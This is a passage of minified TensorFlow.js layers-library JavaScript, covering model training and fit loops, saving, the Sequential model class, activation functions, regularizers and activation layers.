                                    throw new $(`A target Tensor with shape ${r.shape} was passed for an output of shape ${a}, while using a loss function that expects targets to have the same shape as the output.`)
                            }
                        }
                    }
                }
            }(e, this.feedLossFns, this.feedOutputShapes),
            this.stateful && null != o && o > 0 && t[0].shape[0] % o != 0)
                throw new $(`In a stateful network, you should only pass inputs with a number of samples that is divisible by the batch size ${o}. Found: ${t[0].shape[0]} sample(s).`);
            return [t, e]
        }
        async standardizeUserData(t, e, s, o, r=!0, i) {
            const [a,c] = this.standardizeUserDataXY(t, e, r, i);
            if (null != s)
                throw new Error("sample weight is not supported yet.");
            let l = null;
            if (null != o) {
                const u = Q0(o, this.outputNames);
                l = [];
                for (let d = 0; d < u.length; ++d)
                    l.push(await J0(c[d], null, u[d]))
            }
            return [a, c, l]
        }
        testLoop(t, e, s, o=0, r) {
            return M((()=>{
                const i = this.checkNumSamples(e, s, r, "steps")
                  , a = [];
                if (o > 0)
                    throw new bt("Verbose mode is not implemented yet.");
                if (null != r)
                    throw new bt("steps mode in testLoop() is not implemented yet");
                {
                    const c = qh(i, s)
                      , l = Ue($n(0, i));
                    for (let u = 0; u < c.length; ++u) {
                        const d = c[u][0]
                          , h = c[u][1]
                          , p = go(l, d, h - d)
                          , f = jh(e, p)
                          , m = t(f);
                        if (0 === u)
                            for (let g = 0; g < m.length; ++g)
                                a.push(Gt(0));
                        for (let g = 0; g < m.length; ++g) {
                            const b = m[g];
                            a[g] = Q(a[g], E(h - d, b))
                        }
                    }
                    for (let u = 0; u < a.length; ++u)
                        a[u] = dt(a[u], i)
                }
                return a
            }
            ))
        }
        getDedupedMetricsNames() {
            const t = this.metricsNames
              , e = [];
            for (let s = 0; s < t.length; ++s) {
                const o = t[s];
                let r = o;
                if (a0(t, o) > 1) {
                    r += `_${a0(t.slice(0, s), o)}`
                }
                e.push(r)
            }
            return e
        }
        makeTrainFunction() {
            return t=>{
                const e = []
                  , s = t.slice(0, this.inputs.length)
                  , o = t.slice(this.inputs.length, this.inputs.length + this.outputs.length)
                  , r = t.slice(this.inputs.length + this.outputs.length, this.inputs.length + 2 * this.outputs.length)
                  , i = []
                  , c = this.collectedTrainableWeights.map((d=>d.read()));
                return [this.optimizer_.minimize((()=>{
                    const d = [];
                    for (let m = 0; m < this.inputs.length; ++m)
                        d.push({
                            key: this.inputs[m],
                            value: s[m]
                        });
                    const h = new $s(d)
                      , p = Zi(this.outputs, h, {
                        training: !0
                    });
                    let f;
                    for (let m = 0; m < this.lossFunctions.length; ++m) {
                        let b = (0,
                        this.lossFunctions[m])(o[m], p[m]);
                        null != r[m] && (b = nG(b, r[m]));
                        const x = ie(b);
                        e.push(x),
                        f = 0 === m ? b : Q(f, b)
                    }
                    for (let m = 0; m < this.metricsTensors.length; ++m) {
                        let g;
                        if (this.outputs.length > 1 && m < this.outputs.length)
                            g = e[m];
                        else {
                            const b = this.metricsTensors[m][0]
                              , x = this.metricsTensors[m][1];
                            g = ie(b(o[x], p[x]))
                        }
                        en(g),
                        i.push(g)
                    }
                    return f = ie(f),
                    this.calculateLosses().forEach((m=>{
                        f = Q(f, m)
                    }
                    )),
                    f
                }
                ), !0, c)].concat(i)
            }
        }
        makeTestFunction() {
            this.testFunction = t=>M((()=>{
                const e = [];
                let s;
                const o = t.slice(0, this.inputs.length)
                  , r = t.slice(this.inputs.length, this.inputs.length + this.outputs.length)
                  , i = [];
                for (let l = 0; l < this.inputs.length; ++l)
                    i.push({
                        key: this.inputs[l],
                        value: o[l]
                    });
                const a = new $s(i)
                  , c = Zi(this.outputs, a);
                for (let l = 0; l < this.lossFunctions.length; ++l) {
                    const u = this.lossFunctions[l]
                      , d = ie(u(r[l], c[l]));
                    s = 0 === l ? d : Q(s, d),
                    e.push(s)
                }
                for (let l = 0; l < this.metricsTensors.length; ++l) {
                    const u = this.metricsTensors[l][0]
                      , d = this.metricsTensors[l][1]
                      , h = ie(u(r[d], c[d]));
                    e.push(h)
                }
                return e
            }
            ))
        }
        async fit(t, e, s={}) {
            if (this.isTraining)
                throw new Error("Cannot start training because another fit() call is ongoing.");
            let o, r, i, a, c, l, u, d, h;
            this.isTraining = !0;
            try {
                const p = null == s.batchSize ? 32 : s.batchSize;
                Jh(p);
                const m = await this.standardizeUserData(t, e, s.sampleWeight, s.classWeight, !1, p);
                o = m[0],
                r = m[1],
                h = m[2];
                let b, g = !1;
                if (null != s.validationData && s.validationData.length > 0) {
                    if (g = !0,
                    2 !== s.validationData.length)
                        throw 3 === s.validationData.length ? new bt("validationData including sample weights is not supported yet.") : new $(`When passing validation data, it must contain 2 (valX, valY) or 3 (valX, valY, valSampleWeight) items; ${s.validationData} is invalid.`);
                    c = s.validationData[0],
                    l = s.validationData[1];
                    const R = await this.standardizeUserData(c, l, null, null, !0, p);
                    u = R[0],
                    d = R[1],
                    b = u.concat(d)
                } else if (null != s.validationSplit && s.validationSplit > 0 && s.validationSplit < 1) {
                    g = !0;
                    const T = Math.floor(o[0].shape[0] * (1 - s.validationSplit))
                      , R = o[0].shape[0];
                    u = Ui(o, T, R),
                    i = o,
                    o = Ui(o, 0, T),
                    d = Ui(r, T, R),
                    a = r,
                    r = Ui(r, 0, T),
                    b = u.concat(d)
                } else
                    null != s.validationSteps && (g = !0);
                const x = o.concat(r).concat(h);
                this.checkTrainableWeightsConsistency();
                const I = this.makeTrainFunction()
                  , y = this.getDedupedMetricsNames();
                let w, C;
                g ? (this.makeTestFunction(),
                w = this.testFunction,
                C = y.slice().concat(y.map((T=>"val_" + T)))) : (w = null,
                b = [],
                C = y.slice());
                const k = X0(s.callbacks, s.yieldEvery);
                return await this.fitLoop(I, x, y, p, s.epochs, s.verbose, k, w, b, s.shuffle, C, s.initialEpoch, null, null)
            } finally {
                this.isTraining = !1,
                Dn(o, t),
                Dn(r, e),
                Dn(i, t),
                Dn(a, e),
                Dn(u, c),
                Dn(d, l),
                null != h && vt(h)
            }
        }
        async fitLoop(t, e, s, o, r, i, a, c, l, u, d, h, p, f) {
            null == o && (o = 32),
            null == r && (r = 1),
            null == u && (u = !0),
            null == h && (h = 0);
            let m = !1;
            if (null != c && null != l && (m = !0),
            null != f && (m = !0,
            null == p))
                throw new $("Can only use `validationSteps` when doing step-wise training, i.e., `stepsPerEpoch` must be set.");
            const g = this.checkNumSamples(e, o, p, "steps_per_epoch");
            let b;
            null != g && (b = $n(0, g)),
            null == i && (i = 1);
            const {callbackList: x, history: I} = A0(a, i, r, h, g, p, o, m, d);
            x.setModel(this),
            this.history = I,
            await x.onTrainBegin(),
            this.stopTraining_ = !1;
            for (let y = h; y < r; ++y) {
                await x.onEpochBegin(y);
                const w = {};
                if (null != p)
                    throw new bt("stepsPerEpoch mode is not implemented yet.");
                {
                    if ("batch" === u)
                        throw new bt("batch shuffling is not implemneted yet");
                    u && jI(b);
                    const C = Ue(b)
                      , k = qh(g, o);
                    for (let S = 0; S < k.length; ++S) {
                        const T = {};
                        if (await x.onBatchBegin(S, T),
                        M((()=>{
                            const R = k[S][0]
                              , L = k[S][1]
                              , V = go(C, R, L - R);
                            T.batch = S,
                            T.size = L - R;
                            const F = jh(e, V)
                              , X = t(F);
                            for (let A = 0; A < s.length; ++A) {
                                const P = s[A]
                                  , B = X[A];
                                T[P] = B,
                                en(B)
                            }
                            if (S === k.length - 1 && m) {
                                const A = this.testLoop(c, l, o);
                                for (let P = 0; P < s.length; ++P) {
                                    const B = s[P]
                                      , K = A[P];
                                    en(K),
                                    w["val_" + B] = K
                                }
                            }
                        }
                        )),
                        await x.onBatchEnd(S, T),
                        F0(T),
                        this.stopTraining_)
                            break
                    }
                    C.dispose()
                }
                if (await x.onEpochEnd(y, w),
                this.stopTraining_)
                    break
            }
            return await x.onTrainEnd(),
            await this.history.syncData(),
            this.history
        }
        async fitDataset(t, e) {
            return rG(this, t, e)
        }
        async trainOnBatch(t, e) {
            const s = await this.standardizeUserData(t, e)
              , o = s[0]
              , r = s[1]
              , a = this.makeTrainFunction()(o.concat(r))
              , c = [];
            for (const l of a) {
                const u = await l.data();
                c.push(u[0])
            }
            return vt(a),
            Dn(s[0], t),
            Dn(s[1], e),
            Pe(c)
        }
        getNamedWeights(t) {
            const e = []
              , s = null != t && t.trainableOnly
              , o = s ? this.trainableWeights : this.weights
              , r = this.getWeights(s);
            for (let i = 0; i < o.length; ++i)
                s && !o[i].trainable || e.push({
                    name: o[i].originalName,
                    tensor: r[i]
                });
            return e
        }
        set stopTraining(t) {
            this.stopTraining_ = t
        }
        get stopTraining() {
            return this.stopTraining_
        }
        get optimizer() {
            return this.optimizer_
        }
        set optimizer(t) {
            this.optimizer_ !== t && (this.optimizer_ = t,
            this.isOptimizerOwned = !1)
        }
        dispose() {
            const t = super.dispose();
            if (0 === t.refCountAfterDispose && null != this.optimizer && this.isOptimizerOwned) {
                const e = Nc().numTensors;
                this.optimizer_.dispose(),
                t.numDisposedVariables += e - Nc().numTensors
            }
            return t
        }
        getLossIdentifiers() {
            let t;
            if ("string" == typeof this.loss)
                t = ls(this.loss);
            else if (Array.isArray(this.loss)) {
                for (const e of this.loss)
                    if ("string" != typeof e)
                        throw new Error("Serialization of non-string loss is not supported.");
                t = this.loss.map((e=>ls(e)))
            } else {
                const e = Object.keys(this.loss);
                t = {};
                const s = this.loss;
                for (const o of e) {
                    if ("string" != typeof s[o])
                        throw new Error("Serialization of non-string loss is not supported.");
                    t[o] = ls(s[o])
                }
            }
            return t
        }
        getMetricIdentifiers() {
            if ("string" == typeof this.metrics || "function" == typeof this.metrics)
                return [ls(rl(this.metrics))];
            if (Array.isArray(this.metrics))
                return this.metrics.map((t=>ls(rl(t))));
            {
                const t = {};
                for (const e in this.metrics)
                    t[e] = ls(rl(this.metrics[e]));
                return t
            }
        }
        getTrainingConfig() {
            return {
                loss: this.getLossIdentifiers(),
                metrics: this.getMetricIdentifiers(),
                optimizer_config: {
                    class_name: this.optimizer.getClassName(),
                    config: this.optimizer.getConfig()
                }
            }
        }
        loadTrainingConfig(t) {
            if (null != t.weighted_metrics)
                throw new Error("Loading weight_metrics is not supported yet.");
            if (null != t.loss_weights)
                throw new Error("Loading loss_weights is not supported yet.");
            if (null != t.sample_weight_mode)
                throw new Error("Loading sample_weight_mode is not supported yet.");
            const s = us(Yh(t.optimizer_config));
            let o, r;
            if ("string" == typeof t.loss)
                o = po(t.loss);
            else if (Array.isArray(t.loss))
                o = t.loss.map((i=>po(i)));
            else if (null != t.loss) {
                o = {};
                for (const i in t.loss)
                    o[i] = po(t.loss[i])
            }
            if (Array.isArray(t.metrics))
                r = t.metrics.map((i=>po(i)));
            else if (null != t.metrics) {
                r = {};
                for (const i in t.metrics)
                    r[i] = po(t.metrics[i])
            }
            this.compile({
                loss: o,
                metrics: r,
                optimizer: s
            })
        }
        async save(t, e) {
            if ("string" == typeof t) {
                const l = (n=>$e.getSaveHandlers(n))(t);
                if (0 === l.length)
                    throw new $(`Cannot find any save handlers for URL '${t}'`);
                if (l.length > 1)
                    throw new $(`Found more than one (${l.length}) save handlers for URL '${t}'`);
                t = l[0]
            }
            if (null == t.save)
                throw new $("LayersModel.save() cannot proceed because the IOHandler provided does not have the `save` attribute defined.");
            const s = await ym(this.getNamedWeights(e))
              , a = {
                modelTopology: this.toJSON(null, !1),
                format: "layers-model",
                generatedBy: "TensorFlow.js tfjs-layers v4.16.0",
                convertedBy: null
            };
            if (null != e && e.includeOptimizer && null != this.optimizer) {
                a.trainingConfig = this.getTrainingConfig();
                const l = "optimizer"
                  , {data: u, specs: d} = await ym(await this.optimizer.getWeights(), l);
                s.specs.push(...d),
                s.data = function Hw(n) {
                    return Zo.join(n)
                }([s.data, u])
            }
            return null != this.userDefinedMetadata && (_0(this.userDefinedMetadata, this.name, !0),
            a.userDefinedMetadata = this.userDefinedMetadata),
            a.weightData = s.data,
            a.weightSpecs = s.specs,
            t.save(a)
        }
        setUserDefinedMetadata(t) {
            _0(t, this.name),
            this.userDefinedMetadata = t
        }
        getUserDefinedMetadata() {
            return this.userDefinedMetadata
        }
    }
    sr.className = "Model",
    _(sr);
    class rb extends sr {
    }
    rb.className = "Functional",
    _(rb);
    class Yi extends sr {
        constructor(t) {
            if (super({
                inputs: [],
                outputs: []
            }),
            t = t || {},
            this.trainable = !0,
            this.built = !1,
            this.name = null != t.name ? t.name : Bc("sequential_"),
            null != t.layers)
                for (const e of t.layers)
                    this.add(e)
        }
        checkShape(t) {
            if (t.inboundNodes[0].outputTensors[0].shape.some((s=>s < 0)))
                throw new $(`Negative dimension size caused by adding layer ${t.name} with input shape [${t.inboundNodes[0].inputTensors[0].shape}]`)
        }
        add(t) {
            const e = t instanceof Yi || t instanceof sr;
            let s;
            if (e) {
                if (s = t,
                1 !== s.outputs.length)
                    throw new $("All layers in a Sequential model should have a single output tensor. For multi-output layers, use the functional API.");
                if (1 !== s.inputs.length)
                    throw new $("All layers in a Sequential model should have a single input tensor. For multi-input layers, use the functional API.")
            }
            if (0 === this.outputs.length) {
                if (0 === t.inboundNodes.length) {
                    if (null == t.batchInputShape)
                        throw new $("The first layer in a Sequential model must get an `inputShape` or `batchInputShape` argument.");
                    const o = function g$(n) {
                        if (null == n.batchShape && null == n.shape)
                            throw new Error("Please provide to Input either a `shape` or a `batchShape` argument. Note that `shape` does not include the batch dimension.");
                        if (null != n.batchShape && null != n.shape)
                            throw new $("Please provide either a `shape` or `batchShape` argument to Input, but not both.");
                        let t = n.batchShape;
                        null != n.shape && null == t && (t = [null].concat(n.shape));
                        let e = n.dtype;
                        return null == e && (e = "float32"),
                        new Ki({
                            batchInputShape: t,
                            name: n.name,
                            dtype: e,
                            sparse: n.sparse
                        }).inboundNodes[0].outputTensors[0]
                    }({
                        batchShape: t.batchInputShape,
                        dtype: t.dtype,
                        name: t.name + "_input"
                    });
                    t.apply(o)
                }
                if (e)
                    this.outputs = s.outputs,
                    this.inputs = s.inputs;
                else {
                    if (1 !== t.inboundNodes.length)
                        throw new $(`A layer added to a Sequential model must not already be connected somewhere else. LayersModel received layer ${t.name} which has ${t.inboundNodes.length} pre-existing inbound connections.`);
                    if (1 !== t.inboundNodes[0].outputTensors.length)
                        throw new $("All layers in a Sequential model should have a single output tensor. For multi-output layers, use the functional API.");
                    this.checkShape(t),
                    this.outputs = [t.inboundNodes[0].outputTensors[0]],
                    this.inputs = $0(this.outputs[0])
                }
                this.inboundNodes = [],
                new Qc({
                    outboundLayer: this,
                    inboundLayers: [],
                    nodeIndices: [],
                    tensorIndices: [],
                    inputTensors: this.inputs,
                    outputTensors: this.outputs,
                    inputMasks: ho(null, this.inputs.length),
                    outputMasks: [null],
                    inputShapes: this.inputs.map((o=>o.shape)),
                    outputShapes: this.outputs[0].shape
                })
            } else {
                const o = t.apply(this.outputs[0]);
                if (Array.isArray(o))
                    throw new TypeError("All layers in a Sequential model should have a single output tensor. For multi-output layers, use the functional API.");
                this.checkShape(t),
                this.outputs = [o],
                this.inboundNodes[0].outputTensors = this.outputs,
                this.inboundNodes[0].outputShapes = [this.outputs[0].shape]
            }
            this.layers.push(t),
            this.built = !1
        }
        pop() {
            if (0 === this.layers.length)
                throw new TypeError("There are no layers in the model.");
            if (this.layers.pop(),
            0 === this.layers.length)
                this.outputs = [],
                this.inboundNodes = [],
                this.outboundNodes = [];
            else {
                const t = this.layers.length - 1;
                this.layers[t].outboundNodes = [],
                this.outputs = [this.layers[t].output],
                this.inboundNodes[0].outputTensors = this.outputs,
                this.inboundNodes[0].outputShapes = [this.outputs[0].shape]
            }
        }
        call(t, e) {
            return null == this.model && this.build(),
            this.model.call(t, e)
        }
        build(t) {
            if (Nt(t),
            0 === this.inputs.length || 0 === this.outputs.length)
                throw new TypeError("Sequential model cannot be built: model is empty. Add some layers first.");
            this.model = new sr({
                inputs: this.inputs,
                outputs: this.outputs[0],
                name: this.name + "_model"
            }),
            this.model.trainable = this.trainable,
            this.supportsMasking = this.model.supportsMasking,
            this.inputLayers = this.model.inputLayers,
            this.inputLayersNodeIndices = this.model.inputLayersNodeIndices,
            this.inputLayersTensorIndices = this.model.inputLayersTensorIndices,
            this.outputLayers = this.model.outputLayers,
            this.outputLayersNodeIndices = this.model.outputLayersNodeIndices,
            this.outputLayersTensorIndices = this.model.outputLayersTensorIndices,
            this.nodesByDepth = this.model.nodesByDepth,
            this.containerNodes = this.model.containerNodes,
            this.outputNames = this.model.outputNames,
            this.inputNames = this.model.inputNames,
            this.built = !0
        }
        countParams() {
            return this.built || this.build(),
            super.countParams()
        }
        summary(t, e, s=console.log) {
            this.built || this.build(),
            super.summary(t, e, s)
        }
        setWeights(t) {
            null == this.model && this.build(),
            this.model.setWeights(t)
        }
        evaluate(t, e, s={}) {
            if (!this.built)
                throw new gn("The model needs to be compiled before being used.");
            return this.model.evaluate(t, e, s)
        }
        async evaluateDataset(t, e) {
            if (!this.built)
                throw new gn("The model needs to be compiled before being used.");
            return this.model.evaluateDataset(t, e)
        }
        predict(t, e={}) {
            return null == this.model && this.build(),
            this.model.predict(t, e)
        }
        predictOnBatch(t) {
            return null == this.model && this.build(),
            this.model.predictOnBatch(t)
        }
        compile(t) {
            this.build(),
            this.model.compile(t),
            this.optimizer_ = this.model.optimizer,
            this.isOptimizerOwned = this.model.isOptimizerOwned,
            this.loss = this.model.loss,
            this.metrics = this.model.metrics,
            this.metricsTensors = this.model.metricsTensors,
            this.metricsNames = this.model.metricsNames
        }
        get optimizer() {
            return null == this.model ? void 0 : this.model.optimizer
        }
        set optimizer(t) {
            this.model.optimizer = t
        }
        async fit(t, e, s={}) {
            if (!this.built)
                throw new gn("The model needs to be compiled before being used.");
            return this.model.fit(t, e, s)
        }
        async fitDataset(t, e) {
            if (!this.built)
                throw new gn("The model needs to be compiled before being used.");
            return this.model.fitDataset(t, e)
        }
        async trainOnBatch(t, e) {
            return this.model.trainOnBatch(t, e)
        }
        static fromConfig(t, e, s={}, o=!1) {
            let r, i = {};
            if (e instanceof Array) {
                if (null == e[0].className || "Merge" === e[0].className)
                    throw new $("Legacy serialization format not supported yet.");
                r = e
            } else
                v(null != e.layers, (()=>"When the config data for a Sequential model is not an Array, it must be an Object that contains the 'layers' field.")),
                r = e.layers,
                delete e.layers,
                i = e;
            const a = new t(i);
            if (!(a instanceof Yi))
                throw new bt(`Sequential.fromConfig called on non-Sequential input: ${a}`);
            for (const c of r) {
                const u = us(c, void 0, o);
                o && u.setFastWeightInitDuringBuild(!0),
                a.add(u)
            }
            return a
        }
        set stopTraining(t) {
            if (null == this.model)
                throw new $("Cannot set the stopTraining property of a sequential model before it is compiled.");
            this.model.stopTraining = t
        }
        get stopTraining() {
            if (null == this.model)
                throw new $("Cannot get the stopTraining property of a sequential model before it is compiled.");
            return this.model.stopTraining
        }
        getConfig() {
            const t = [];
            for (const e of this.layers) {
                const s = {};
                s.className = e.getClassName(),
                s.config = e.getConfig(),
                t.push(s)
            }
            return {
                name: this.name,
                layers: t
            }
        }
    }
    Yi.className = "Sequential",
    _(Yi);
    let Oe = class extends qo {
        getConfig() {
            return {}
        }
    }
    ;
    class ib extends Oe {
        apply(t, e=1) {
            return function t$(n, t=1) {
                if (1 !== t)
                    throw new bt(`Support for alpha values other than 1 (${t}) is not implemented yet.`);
                return Gc(n)
            }(t, e)
        }
    }
    ib.className = "elu",
    _(ib);
    class ab extends Oe {
        apply(t) {
            return Qm(t)
        }
    }
    ab.className = "selu",
    _(ab);
    class cb extends Oe {
        apply(t) {
            return io(t)
        }
    }
    cb.className = "relu",
    _(cb);
    class lb extends Oe {
        apply(t) {
            return M((()=>Gi(6, io(t))))
        }
    }
    lb.className = "relu6",
    _(lb);
    class ub extends Oe {
        apply(t) {
            return t
        }
    }
    ub.className = "linear",
    _(ub);
    class db extends Oe {
        apply(t) {
            return _o(t)
        }
    }
    db.className = "sigmoid",
    _(db);
    class hb extends Oe {
        apply(t) {
            return function n$(n) {
                return M((()=>{
                    const t = Q(.5, E(.2, n));
                    return nn(t, 0, 1)
                }
                ))
            }(t)
        }
    }
    hb.className = "hardSigmoid",
    _(hb);
    class pb extends Oe {
        apply(t) {
            return $i(t)
        }
    }
    pb.className = "softplus",
    _(pb);
    class fb extends Oe {
        apply(t) {
            return function e$(n) {
                return M((()=>dt(n, Q(Ge(n), 1))))
            }(t)
        }
    }
    fb.className = "softsign",
    _(fb);
    class mb extends Oe {
        apply(t) {
            return pd(t)
        }
    }
    mb.className = "tanh",
    _(mb);
    let ep = class extends Oe {
        apply(t, e=-1) {
            return zd(t, e)
        }
    }
    ;
    ep.className = "softmax",
    _(ep);
    class gb extends Oe {
        apply(t, e=-1) {
            return Pm(t, e)
        }
    }
    gb.className = "logSoftmax",
    _(gb);
    class bb extends Oe {
        apply(t, e=1) {
            return M((()=>E(_o(E(t, e)), t)))
        }
    }
    bb.className = "swish",
    _(bb);
    class xb extends Oe {
        apply(t) {
            return M((()=>E(t, pd($i(t)))))
        }
    }
    function Gs(n) {
        return n.getClassName()
    }
    function np(n, t={}) {
        return zi(n, mn.getMap().classNameMap, t, "activation")
    }
    function Ls(n) {
        if (null == n) {
            const t = {
                className: "linear",
                config: {}
            };
            return np(t)
        }
        if ("string" == typeof n) {
            const t = {};
            return t.className = n,
            t.config = {},
            np(t)
        }
        return n instanceof Oe ? n : np(n)
    }
    xb.className = "mish",
    _(xb);
    class yb extends qo {
    }
    class Ib extends yb {
        constructor(t) {
            super(),
            function fG(n) {
                if (null != n && "object" != typeof n)
                    throw new Error(`Argument to L1L2 regularizer's constructor is expected to be an object, but received: ${n}`)
            }(t),
            this.l1 = null == t || null == t.l1 ? .01 : t.l1,
            this.l2 = null == t || null == t.l2 ? .01 : t.l2,
            this.hasL1 = 0 !== this.l1,
            this.hasL2 = 0 !== this.l2
        }
        apply(t) {
            return M((()=>{
                let e = ge([1]);
                return this.hasL1 && (e = Q(e, ut(E(this.l1, Ge(t))))),
                this.hasL2 && (e = Q(e, ut(E(this.l2, Pi(t))))),
                W(e, [])
            }
            ))
        }
        getConfig() {
            return {
                l1: this.l1,
                l2: this.l2
            }
        }
        static fromConfig(t, e) {
            return new t({
                l1: e.l1,
                l2: e.l2
            })
        }
    }
    Ib.className = "L1L2",
    _(Ib);
    const wb = {
        l1l2: "L1L2"
    };
    function Vt(n) {
        return Th(n)
    }
    function Cb(n, t={}) {
        return zi(n, mn.getMap().classNameMap, t, "regularizer")
    }
    function _t(n) {
        if (null == n)
            return null;
        if ("string" == typeof n) {
            return Cb({
                className: n in wb ? wb[n] : n,
                config: {}
            })
        }
        return n instanceof yb ? n : Cb(n)
    }
    class vb extends Ct {
        constructor(t) {
            super(t ?? {}),
            this.supportsMasking = !0,
            null != t && (this.maxValue = t.maxValue)
        }
        call(t, e) {
            t = mt(t);
            let s = io(t);
            return null != this.maxValue && (s = nn(s, 0, this.maxValue)),
            s
        }
        computeOutputShape(t) {
            return t
        }
        getConfig() {
            const t = {
                maxValue: this.maxValue
            }
              , e = super.getConfig();
            return Object.assign(t, e),
            t
        }
    }
    vb.className = "ReLU",
    _(vb);
    class Sb extends Ct {
        constructor(t) {
            super(t ?? {}),
            this.DEFAULT_ALPHA = .3,
            null == t && (t = {}),
            this.alpha = null == t.alpha ? this.DEFAULT_ALPHA : t.alpha
        }
        call(t, e) {
            const s = mt(t);
            return Cd(s, this.alpha)
        }
        computeOutputShape(t) {
            return t
        }
        getConfig() {
            const t = {
                alpha: this.alpha
            }
              , e = super.getConfig();
            return Object.assign(t, e),
            t
        }
    }
    Sb.className = "LeakyReLU",
    _(Sb);
    class kb extends Ct {
        constructor(t) {
            if (super(t ?? {}),
            this.DEFAULT_ALPHA_INITIALIZER = "zeros",
            null == t && (t = {}),
            this.supportsMasking = !0,
            this.alphaInitializer = Ht(t.alphaInitializer || this.DEFAULT_ALPHA_INITIALIZER),
            this.alphaRegularizer = _t(t.alphaRegularizer),
            this.alphaConstraint = he(t.alphaConstraint),
            null == t.sharedAxes)
                this.sharedAxes = null;
            else if (Array.isArray(t.sharedAxes))
                this.sharedAxes = t.sharedAxes;
            else {
                if ("number" != typeof t.sharedAxes)
                    throw new $(`Expected sharedAxes to be a number or an array of numbers, but got ${t.sharedAxes}`);
                this.sharedAxes = [t.sharedAxes]
            }
        }
        build(t) {
            const e = (t = Nt(t)).slice(1);
            if (null != this.sharedAxes)
                for (const o of this.sharedAxes)
                    e[o - 1] = 1;
            this.alpha = this.addWeight("alpha", e, "float32", this.alphaInitializer, this.alphaRegularizer, !0, this.alphaConstraint);
            const s = {};
            if (null != this.sharedAxes)
                for (let o = 1; o < t.length; ++o)
                    s[o] = t[o];
            this.inputSpec = [new ue({
                ndim: t.length,
                axes: s
            })],
            this.built = !0
        }
        call(t, e) {
            return t = mt(t),
            Rd(t, this.alpha.read())
        }
        getConfig() {
            const t = {
                alphaInitializer: Qt(this.alphaInitializer),
                alphaRegularizer: Vt(this.alphaRegularizer),
                alphaConstraint: de(this.alphaConstraint),
                sharedAxes: this.sharedAxes
            }
              , e = super.getConfig();
            return Object.assign(t, e),
            t
        }
    }
    kb.className = "PReLU",
    _(kb);
    let Tb = class extends Ct {
        constructor(t) {
            if (super(t ?? {}),
            this.DEFAULT_ALPHA = 1,
            null == t && (t = {}),
            null != t.alpha && t.alpha !== this.DEFAULT_ALPHA)
                throw new bt(`Non-default alpha value (${t.alpha}) is not supported by the ELU layer yet.`);
            this.alpha = null == t.alpha ? this.DEFAULT_ALPHA : t.alpha
        }
        call(t, e) {
            const s = mt(t);
            return Gc(s)
        }
        computeOutputShape(t) {
            return t
        }
        getConfig() {
            const t = {
                alpha: this.alpha
            }
              , e = super.getConfig();
            return Object.assign(t, e),
            t
        }
    }
    ;
    Tb.className = "ELU",
    _(Tb);
    class Nb extends Ct {
        constructor(t) {
            super(t ?? {}),
            this.DEFAULT_THETA = 1,
            null == t && (t = {}),
            this.theta = null == t.theta ? this.DEFAULT_THETA : t.theta
        }
        call(t, e) {
            const s = mt(t);
            return E(s, st(sn(s, this.theta), "float32"))
        }
        computeOutputShape(t) {
            return t
        }
        getConfig() {
            const t = {
                theta: this.theta
            }
              , e = super.getConfig();
            return Object.assign(t, e),
            t
        }
    }
    Nb.className = "ThresholdedReLU",
    _(Nb);
    class Rb extends Ct {
        constructor(t) {
            super(t ?? {}),
            this.DEFAULT_AXIS = 1,
            null == t && (t = {}),
            this.softmax = (new ep).apply,
            this.axis = null == t.axis ? this.DEFAULT_AXIS : t.axis
        }
        call(t, e) {
            return M((()=>{
                let s = mt(t);
                const o = e.mask;
                if (null != o) {
                    const r = E(pt(Ss(s.shape), st(o, s.dtype)), Gt(-1e9));
                    s = Q(s, r)
                }
                return this.axis instanceof Array ? this.axis.length > 1 ? An(pt(s, Om(s, this.axis, !0))) : this.softmax(s, this.axis[0]) : this.softmax(s, this.axis)
            }
            ))
        }
        computeOutputShape(t) {
            return t
        }
        getConfig() {
            const t = {
                axis: this.axis
            }
              , e = super.getConfig();
            return Object.assign(t, e),
            t
        }
    }
    function or(n, t, e) {
        if ("number" == typeof n)
            return ho(n, t);
        if (n.length !== t)
            throw new $(`The ${e} argument must be an integer or tuple of ${t} integers. Received: ${n.length} elements.`);
        for (let s = 0; s < t; ++s) {
            const o = n[s];
            if (!QR(o))
                throw new $(`The ${e} argument must be an integer or tuple of ${t} integers. Received: ${JSON.stringify(n)} including a non-integer number ${o}`)
        }
        return n
    }
    function Wn(n, t, e, s, o=1) {
        if (null == n)
            return n;
        let i;
        return i = "same" === e ? n : n - (t + (t - 1) * (o - 1)) + 1,
        Math.floor((i + s - 1) / s)
    }
    function Yn(n, t, e, s) {
        if (null == n)
            return null;
        if ("valid" === s)
            n = n * t + Rs([e - t, 0]);
        else {
            if ("same" !== s)
                throw new $(`Unsupport padding mode: ${s}.`);
            n *= t
        }
        return n
    }
    function sp(n, t) {
        return M((()=>(se(t),
        "channelsFirst" === t ? kt(n, [0, 2, 3, 1]) : n)))
    }
    function $b(n, t) {
        return M((()=>(se(t),
        "channelsFirst" === t ? kt(n, [0, 2, 3, 4, 1]) : n)))
    }
    function Gb(n, t, e, s=[1, 1], o="valid", r, i, a=null) {
        return M((()=>{
            if (null == r && (r = "channelsLast"),
            se(r),
            3 !== n.rank && 4 !== n.rank)
                throw new $(`conv2dWithBiasActivation expects input to be of rank 3 or 4, but received ${n.rank}.`);
            if (3 !== t.rank && 4 !== t.rank)
                throw new $(`conv2dWithBiasActivation expects kernel to be of rank 3 or 4, but received ${n.rank}.`);
            let c = sp(n, r);
            if ("causal" === o)
                throw new bt("The support for CAUSAL padding mode in conv1dWithBias is not implemented yet.");
            return c = vk({
                x: c,
                filter: t,
                strides: s,
                pad: "same" === o ? "same" : "valid",
                dilations: i,
                dataFormat: "NHWC",
                bias: e,
                activation: a
            }),
            "channelsFirst" === r && (c = kt(c, [0, 3, 1, 2])),
            c
        }
        ))
    }
    Rb.className = "Softmax",
    _(Rb);
    class al extends Ct {
        constructor(t, e) {
            if (super(e),
            this.bias = null,
            this.DEFAULT_KERNEL_INITIALIZER = "glorotNormal",
            this.DEFAULT_BIAS_INITIALIZER = "zeros",
            al.verifyArgs(e),
            this.rank = t,
            be(this.rank, "rank"),
            1 !== this.rank && 2 !== this.rank && 3 !== this.rank)
                throw new bt(`Convolution layer for rank other than 1, 2, or 3 (${this.rank}) is not implemented yet.`);
            if (this.kernelSize = or(e.kernelSize, t, "kernelSize"),
            this.strides = or(null == e.strides ? 1 : e.strides, t, "strides"),
            this.padding = null == e.padding ? "valid" : e.padding,
            rn(this.padding),
            this.dataFormat = null == e.dataFormat ? "channelsLast" : e.dataFormat,
            se(this.dataFormat),
            this.activation = Ls(e.activation),
            this.useBias = null == e.useBias || e.useBias,
            this.biasInitializer = Ht(e.biasInitializer || this.DEFAULT_BIAS_INITIALIZER),
